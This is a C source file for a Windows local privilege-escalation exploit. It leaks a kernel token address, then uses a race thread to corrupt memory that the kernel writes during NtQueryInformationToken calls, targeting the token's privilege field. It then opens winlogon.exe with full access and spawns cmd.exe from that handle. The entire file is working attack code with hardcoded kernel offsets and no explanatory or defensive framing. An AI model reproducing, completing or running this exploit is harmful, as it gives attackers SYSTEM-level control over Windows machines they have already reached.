#include <Windows.h>
#include <stdio.h>
#include "ex.h"

#pragma comment(lib, "ntdll.lib")

#define OFFSET_PID 0x440
#define OFFSET_PROCESS_LINKS 0x448
#define OFFSET_TOKEN 0x4b8
#define OFFSET_KPROCESS 0x220

typedef NTSTATUS(*pNtWriteVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(*pNtReadVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    OUT PVOID               Buffer,
    IN ULONG                NumberOfBytesToRead,
    OUT PULONG              NumberOfBytesRead OPTIONAL
);

typedef NTSTATUS NtQueryInformationToken(
    HANDLE                  TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID                   TokenInformation,
    ULONG                   TokenInformationLength,
    PULONG                  ReturnLength
);

typedef struct _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION {
    ULONG SecurityAttributeCount;
    struct _LIST_ENTRY SecurityAttributesList;
    ULONG WorkingSecurityAttributeCount;
    struct _LIST_ENTRY WorkingSecurityAttributesList;
} AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION, *PAUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

NtQueryInformationToken* pQueryInfoToken = NULL;
HANDLE hToken;
BYTE* TokenInfo = NULL;
DWORD Infolen = 0x1000;
DWORD retlen = 0;
DWORD OffsetToName = 0;
BYTE* RaceAddr = NULL;
ULONGLONG kTokenAddr = 0;

void RaceThread() {
    ULONGLONG value = kTokenAddr + 0x40 - 4;
    for (int i = 0; i < 0x10000; i++) {
        *(WORD*)(RaceAddr + 2) = 2;
        *(ULONGLONG*)(RaceAddr + 8) = value;
    }
}

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll");
    pQueryInfoToken = (NtQueryInformationToken*)GetProcAddress(ntdll, "NtQueryInformationToken");

    if (!pQueryInfoToken) {
        fprintf(stderr, "Failed to get NtQueryInformationToken address.\n");
        return -1;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        fprintf(stderr, "Failed to open process token.\n");
        return -1;
    }

    kTokenAddr = (ULONGLONG)GetKernelPointerByHandle(hToken);
    printf("hToken: %p, kTokenAddr: %p\n", hToken, (void*)kTokenAddr);

    getchar();

    TokenInfo = (BYTE*)VirtualAlloc(NULL, Infolen, MEM_COMMIT, PAGE_READWRITE);
    if (!TokenInfo) {
        fprintf(stderr, "Failed to allocate memory for token information.\n");
        return -1;
    }

    NTSTATUS status = pQueryInfoToken(hToken, (TOKEN_INFORMATION_CLASS)22, TokenInfo, Infolen, &retlen);
    if (status != 0) {
        fprintf(stderr, "NtQueryInformationToken failed with status: 0x%x\n", status);
        return -1;
    }

    _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION* pSecurityAttributes = 
        (_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION*)((_TOKEN_ACCESS_INFORMATION*)TokenInfo)->SecurityAttributes;
    if (pSecurityAttributes->SecurityAttributeCount) {
        BYTE* Flink = (BYTE*)pSecurityAttributes->SecurityAttributesList.Flink;
        if (Flink) {
            OffsetToName = Flink + 0x20 - TokenInfo;
            printf("Found target offset value: 0x%x\n", OffsetToName);
        }
    }

    if (!OffsetToName) {
        fprintf(stderr, "Failed to find target offset value.\n");
        return -1;
    }

    RaceAddr = TokenInfo + OffsetToName;
    printf("Target address = %p\n", (void*)RaceAddr);

    HANDLE hWinLogon = INVALID_HANDLE_VALUE;
    ULONG pid = GetPidByName(L"winlogon.exe");
    while (1) {
        HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RaceThread, NULL, 0, NULL);
        if (!h) {
            fprintf(stderr, "Failed to create race thread.\n");
            return -1;
        }
        SetThreadPriority(h, THREAD_PRIORITY_TIME_CRITICAL);

        for (int i = 0; i < 5000; i++) {
            pQueryInfoToken(hToken, (TOKEN_INFORMATION_CLASS)22, TokenInfo, Infolen, &retlen);
        }

        WaitForSingleObject(h, INFINITE);

        hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (hWinLogon) {
            break;
        }
    }

    printf("Got Winlogon handle: %p\n", hWinLogon);
    getchar();

    if (!CreateProcessFromHandle(hWinLogon, (LPSTR)"C:\\Windows\\system32\\cmd.exe")) {
        fprintf(stderr, "Failed to create process from handle.\n");
    }

    CloseHandle(hWinLogon);
    CloseHandle(hToken);

    return 0;
}
